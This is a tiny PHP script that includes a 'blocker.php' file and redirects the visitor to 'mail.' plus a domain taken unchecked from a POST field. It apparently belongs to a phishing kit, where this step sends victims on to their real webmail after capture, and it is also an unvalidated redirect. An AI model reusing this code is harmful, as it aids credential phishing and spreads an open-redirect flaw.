<?php
session_start();
ob_start();
include "blocker.php";

$domain = $_POST['Udomain'];
header("Location: http://mail.".$domain);

?>